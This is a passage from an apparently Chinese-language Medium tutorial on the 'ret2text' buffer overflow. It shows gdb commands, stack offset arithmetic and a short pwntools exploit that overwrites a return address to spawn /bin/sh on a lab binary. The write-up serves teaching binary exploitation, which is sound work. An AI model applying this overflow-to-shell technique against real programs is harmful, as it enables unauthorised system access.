&amp;input);<br>  if ( input == secretcode )<br>    system(&quot;/bin/sh&quot;);<br>}</pre><p name="4e42" id="4e42" class="graf graf--p graf-after--pre">由于在secure函数中存在系统调用函数system(“/bin/sh”)，按下Tab查看到“/bin/sh”的代码地址位于0x0804863A。所以如果我们直接控制程序返回到0x0804863A，那么我们就可以得到系统的shell了。</p><p name="0166" id="0166" class="graf graf--p graf-after--p">下面我们来构造exp脚本。对于main函数中的gets函数来说，根据IDA32中的内容可得，程序在0x080486AE处调用了CALL _gets，所以我们将断点下在0x080486AE处来研究如何使栈溢出。在gbd中我们输入代码：</p><pre name="fbec" id="fbec" class="graf graf--pre graf-after--p">b *0x080486AE<br>r</pre><p name="f1fb" id="f1fb" class="graf graf--p graf-after--pre">此时，我们来查看esp（栈顶指针）和ebp（栈底指针）寄存器的情况。</p><figure name="779a" id="779a" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*MtidfbbPZEfNvnOf26888A.png" data-width="996" data-height="300" src="https://cdn-images-1.medium.com/max/800/1*MtidfbbPZEfNvnOf26888A.png"></figure><p name="f80b" id="f80b" class="graf graf--p graf-after--figure">通过main函数的注释我们可以得到在IDA的静态调试中，字符串s和esp的距离为0x1c，和ebp的距离为0x64。但是由于在动态调试中s和esp的距离和静态调试中相同而和ebp的距离会因为数据的不同而改变，所以这里使用和esp的距离0x1c来计算同栈底的距离。</p><pre name="598d" id="598d" class="graf graf--pre graf-after--p">esp 0xff96aab0    <br>| &lt;- 0x1c         <br>s ?               <br>| &lt;- ?                <br>ebp 0xff96ab38</pre><p name="7648" id="7648" class="graf graf--p graf-after--pre">计算得到：</p><pre name="569c" id="569c" class="graf graf--pre graf-after--p">esp 0xff96aab0    <br>| &lt;- 0x1c<br>s   0xff96aacc<br>| &lt;- 0x6c<br>ebp 0xff96ab38 </pre><p name="80e1" id="80e1" class="graf graf--p graf-after--pre">因此s相对于ebp的偏移是[0x6c]，所以s相对于返回地址的偏移（距离）就是距离栈底的距离再加一个32位单位（4字节）。所以有下图所示：</p><pre name="a14d" id="a14d" class="graf graf--pre graf-after--p">esp 0xff96aab0    <br>| &lt;- 0x1c<br>s   0xff96aacc<br>| &lt;- 0x6c<br>ebp 0xff96ab38<br>| &lt;- 0x4<br>return </pre><p name="daab" id="daab" class="graf graf--p graf-after--pre">等回到return 地址之后，我们再通过p32指令给定地址return到0x0804863A就可以获取到shell了。于是有如下exp脚本：</p><pre name="14fa" id="14fa" class="graf graf--pre graf-after--p">from pwn import *</pre><pre name="2d76" id="2d76" class="graf graf--pre graf-after--pre">sh = process(&#39;./ret2text&#39;)<br>target = 0x0804863A<br>sh.sendline(&#39;a&#39;*(0x6c+4) + str(p32(target)))<br>sh.interactive</pre><p name="1ef7" id="1ef7" class="graf graf--p graf-after--pre">运行即可getshell。</p><figure name="93a6" id="93a6" class="graf graf--figure graf-after--p graf--trailing"><img class="graf-image" data-image-id="1*rnPzj3glni9nXupsD5pCgA.png" data-width="920" data-height="232" src="https://cdn-images-1.medium.com/max/800/1*rnPzj3glni9nXupsD5pCgA.png"></figure></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@adamedelweiss" class="p-author h-card">Adam Edelweiss</a> on <a href="https://medium.com/p/a1beba929ff7"><time class="dt-published" datetime="2020-08-10T10:28:04.627Z">August 10, 2020</time></a>.</p><p><a href="https://medium.com/@adamedelweiss/pwn%E5%AF%BC%E8%AE%BA1-docker%E7%8E%AF%E5%A2%83%E5%92%8C%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7-a1beba929ff7" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on December 15, 2021.</p></footer></article></body></html>